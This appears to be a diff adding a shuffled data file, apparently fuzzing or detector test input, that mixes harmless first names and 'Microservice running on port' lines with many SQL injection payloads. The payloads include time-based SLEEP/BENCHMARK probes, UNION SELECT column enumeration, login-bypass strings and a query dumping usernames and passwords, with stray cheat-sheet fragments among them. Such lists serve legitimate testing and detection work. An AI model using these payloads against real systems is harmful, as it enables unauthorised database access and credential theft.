+'WHERE 1=1 AND 1=0'
+'John'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Hank'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'"
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'HAVING 1=0#'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'"
+'Grace'
+'Bob'
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'"
+'Charlie'
+'David'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'"
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'"
+'Jill'
+'Jill'
+"'""""""""'"
+'AND 1=0#'
+'OR x=x'
+'Hank'
+'David'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'ORDER BY 11--'
+"'UNION ALL SELECT 1,2,3,4,5,6'"
+'1' ORDER BY 2--+'
+'OR x=x--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'"
+"'admin"""" or """"1""""=""""1""""/*'"
+'John'
+"'and (select substring(@@version,3,1))='X''"
+'or 1=1/*'
+'John'
+'Comments:'
+'Jill'
+'David'
+'Jill'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Grace'
+'') or pg_sleep(5)--'
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'"
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'"
+'&&SLEEP(5)#'
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#'
+'UNION ALL SELECT SLEEP(5)--'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+'Alice'
+'HAVING 1=1--'
+''''''''''''''UNION SELECT '2'
+'David'
+'Grace'
+'Hank'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+'John'
+'Hank'
+'David'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'"
+'Alice'
+'Hank'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'Grace'
+'UNION ALL SELECT 1'
+'Eve'
+'Fran'
+'Grace'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+"'UNION ALL SELECT 1,2,3,4,5,6--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'"
+'+ SLEEP(10) + ''
+'AND 1=0 AND '%'=''
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+'' OR 'x'='x'
+'Alice'
+"'"""" or """"""""*""""'"
+';
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'Bob'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'"
+'Grace'
+'Grace'
+'Fran'
+'David'
+'' OR 'x'='x'
+'John'
+'Alice'
+'Charlie'
+'John'
+'Alice'
+'Eve'
+'Hank'
+'Bob'
+"'' or """"'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+"'benchmark(50000000,MD5(1))#'"
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'John'
+'Fran'
+'Charlie'
+'Hank'
+"'admin"""") or (""""1""""=""""1'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+'Jill'
+'Fran'
+'Bob'
+'UNION ALL SELECT 1#'
+'Fran'
+'Fran'
+'ORDER BY 23#'
+'Eve'
+'Eve'
+"'admin"""" or """"1""""=""""1""""--'"
+'Fran'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Alice'
+"'' UNION SELECT 1,2,3 --'"
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'"
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'"
+'Alice'
+'OR x=x--'
+'Eve'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+"','"
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'"
+'Charlie'
+'David'
+'ORDER BY 28#'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'"
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'' UNION SELECT 1,2,3 --'"
+'AnD SLEEP(5)--'
+'Eve'
+'John'
+'Eve'
+'Bob'
+'AND true'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--'"
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'John'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'John'
+'Eve'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'"
+'ORDER BY 19#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'# from wapiti'
+"'ORDER BY 1,SLEEP(5)#'"
+'Hank'
+'Eve'
+'Alice'
+'Alice'
+'||		(double pipe) concatenate'
+'Hank'
+'David'
+'UNION ALL SELECT NULL'
+'Bob'
+"'admin""""or 1=1 or """"""""=""""'"
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'Bob'
+"'-1 UNION SELECT 1 INTO @,@,@'"
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'"
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),""""'3'"
+'WHERE 1=1 AND 1=1--'
+"'' UNION SELECT null, username, password FROM users --'"
+'Hank'
+'WHERE 1=1 AND 1=1--'
+"'admin"""") or """"1""""=""""1'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'ORDER BY 10--'
+'Charlie'
+'Jill'
+'Charlie'
+'Grace'
+'Eve'
+'Alice'
+'David'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'"
+'Bob'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'"
+"'+		addition, concatenate (or space in url)'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Charlie'
+'John'
+'Grace'
+'WHERE 1=1 AND 1=1#'
+'Hank'
+'Jill'
+'ORDER BY SLEEP(5)'
+'John'
+'Charlie'
+'Eve'
+'John'
+'||		(double pipe) concatenate'
+'Eve'
+"'"""");"
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'"
+'Alice'
+'Jill'
+'Fran'
+'John'
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Hank'
+"'"""" OR 1 = 1 -- -'"
+"'"""" or pg_sleep(5)--'"
+'AND 1=1--'
+'Charlie'
+'John'
+'David'
+'Alice'
+'Grace'
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Jill'
+"'"""" or """"""""-""""'"
+'ORDER BY 15--'
+'Jill'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'or pg_SLEEP(5)#'
+'Charlie'
+'Bob'
+'David'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+'Charlie'
+'Grace'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+"'"""" or """"""""^""""'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'Grace'
+'Bob'
+'Alice'
+'ORDER BY 10#'
+'Jill'
+'Hank'
+'Charlie'
+"',(select * from (select(sleep(10)))a)'"
+'Fran'
+'Hank'
+'
+"'ORDER BY 1,SLEEP(5),3,4--'"
+'Eve'
+'David'
+'Charlie'
+'UNION ALL SELECT NULL'
+"'""""""""'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Bob'
+'Eve'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'Grace'
+'Alice'
+''''
+'UNION ALL SELECT NULL'
+Microservice running on port 3000
+'Charlie'
+'John'
+'Bob'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+'David'
+'Eve'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+"'UNION ALL SELECT 1,2'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'WHERE 1=1 AND 1=1'
+'/*  	C-style comment'
+"','"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Jill'
+'Charlie'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+'AS INJECTX WHERE 1=1 AND 1=1'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'"
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Eve'
+'Charlie'
+"'admin"""" or """"1""""=""""1""""#'"
+'Fran'
+'Bob'
+'Hank'
+'AND 1=1 AND '%'=''
+'David'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+'Bob'
+'Fran'
+'John'
+'Charlie'
+"'"""" OR """""""" = """"'"
+'OR 1=1'
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'"
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'"
+'Alice'
+'Grace'
+'OR 1=1--'
+'Charlie'
+'Alice'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+'Alice'
+'Jill'
+'Hank'
+'John'
+"'"""" or sleep(5)=""""'"
+'Grace'
+'David'
+'Jill'
+'ORDER BY 19--'
+'Charlie'
+''&&SLEEP(5)&&'1'
+'# Numeric'
+'Bob'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+'Grace'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'and (select substring(@@version,2,1))='i''"
+"''\""""'"
+'John'
+'Grace'
+'Eve'
+"'"""" OR """""""" = """"'"
+'Fran'
+'John'
+'Charlie'
+'Grace'
+"'"""") or (""""x"""")=(""""x'"
+'Jill'
+'Jill'
+'Grace'
+'Charlie'
+'Fran'
+'Grace'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+''''''''''''''UNION SELECT '2'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+'Alice'
+'Jill'
+'ORDER BY 12--'
+'+ SLEEP(10) + ''
+'Hank'
+'ORDER BY 30#'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'Bob'
+'Eve'
+"'ORDER BY 1,SLEEP(5),3--'"
+'-2'
+'Hank'
+'Eve'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14'"
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'"
+'Bob'
+'John'
+'David'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--'"
+'David'
+'Jill'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'David'
+'`	    Backtick'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9'"
+'Eve'
+'Hank'
+'ORDER BY SLEEP(5)#'
+'AND 1083=1083 AND (1427=1427'
+'Alice'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'"
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'"
+'Eve'
+'Hank'
+'Alice'
+'Alice'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+'Eve'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'"
+"'admin"""" #'"
+'AS INJECTX WHERE 1=1 AND 1=0#'
+'# Numeric'
+'Grace'
+'Bob'
+'Grace'
+'ORDER BY 11--'
+'Charlie'
+"'or benchmark(50000000,MD5(1))'"
+'OR 1=0--'
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --'
+'WHERE 1=1 AND 1=1#'
+'Fran'
+"'"""" or """"""""-""""'"
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'"
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'"
+'Eve'
+'Alice'
+'Jill'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'"
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+Microservice running on port 12345
+'Hank'
+'ORDER BY 2#'
+'John'
+'David'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+'or true--'
+'ORDER BY 26'
+'or SLEEP(5)#'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'"
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'Charlie'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Eve'
+'Hank'
+'ORDER BY 3'
+'John'
+'UNION ALL SELECT SLEEP(5)--'
+'Bob'
+'Alice'
+'Charlie'
+'Fran'
+'Charlie'
+'AND 7506=9091 AND ('5913=5913'
+'Grace'
+'Grace'
+'Grace'
+'Fran'
+'John'
+"'admin"""") or """"1""""=""""1""""--'"
+'Bob'
+'Fran'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'"
+'Fran'
+''-''
+'' OR '1'
+'Fran'
+'Jill'
+"'ORDER BY 1,SLEEP(5),3,4#'"
+'Jill'
+'David'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+'Eve'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'"
+'HAVING 1=1--'
+'AND 1=0#'
+'Bob'
+'Hank'
+"'1' ORDER BY 1,2,3--+'"
+'admin') or ('1'='1'/*'
+'Grace'
+'Charlie'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'"
+'Charlie'
+'Charlie'
+'Fran'
+'John'
+'Hank'
+'Charlie'
+'Jill'
+'Fran'
+'OR 1=1--'
+'admin' or '1'='1'--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+'Hank'
+'Bob'
+'Eve'
+'Jill'
+Microservice running on port 6000
+'AND 1'
+'Jill'
+'Hank'
+"'or benchmark(50000000,MD5(1))'"
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'"
+'John'
+'Charlie'
+'Fran'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'Eve'
+'David'
+'%2c(select%20*%20from%20(select(sleep(10)))a)'
+'OR x=x'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'David'
+'Bob'
+'David'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+'ORDER BY SLEEP(5)--'
+'Grace'
+'Grace'
+'Fran'
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+'Grace'
+'Fran'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'"
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'"
+'David'
+'Fran'
+'ORDER BY 22#'
+'Grace'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'"
+'Grace'
+'ORDER BY 6#'
+'Alice'
+'Bob'
+'David'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'"
+'Jill'
+'Charlie'
+'Charlie'
+'ORDER BY 14#'
+'David'
+'ORDER BY 4#'
+'AND 1=1--'
+'Charlie'
+'John'
+'Jill'
+'Eve'
+'Hank'
+"'"""" or sleep(5)=""""'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'David'
+'ORDER BY 21--'
+'John'
+'Hank'
+'Eve'
+'ORDER BY 7--'
+'Alice'
+'John'
+'or 1=1#'
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'"
+'Jill'
+'Bob'
+'Grace'
+'Grace'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'"
+"'' or benchmark(10000000,MD5(1))#'"
+'Grace'
+'John'
+'John'
+'Alice'
+'Fran'
+'AND 1083=1083 AND ('1427=1427'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+'Grace'
+'Finding the table name'
+'ORDER BY 4--'
+'David'
+''LIKE''
+'AnD SLEEP(5)--'
+'Jill'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'Hank'
+"'') or benchmark(10000000,MD5(1))#'"
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7'"
+'Eve'
+'Charlie'
+'Bob'
+"'"""") or sleep(5)=""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+"'"""" or sleep(5)=""""'"
+'ORDER BY 10--'
+'AND 7300=7300 AND ('pKlZ'='pKlZ'
+'Bob'
+'John'
+'Fran'
